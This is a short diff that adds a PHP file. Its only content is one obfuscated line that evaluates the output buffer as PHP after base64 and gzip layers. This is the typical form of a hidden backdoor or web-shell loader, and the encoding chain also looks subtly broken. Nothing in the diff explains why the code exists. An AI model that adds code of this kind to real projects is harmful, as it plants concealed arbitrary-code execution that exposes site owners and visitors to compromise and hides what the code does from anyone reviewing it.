@@ -1,0 +1,4 @@
+<?php
+eval(gzinflate(base64_decode(strtr(base64_encode(ob_get_contents()), '+/', '-_'))));
+
+?>
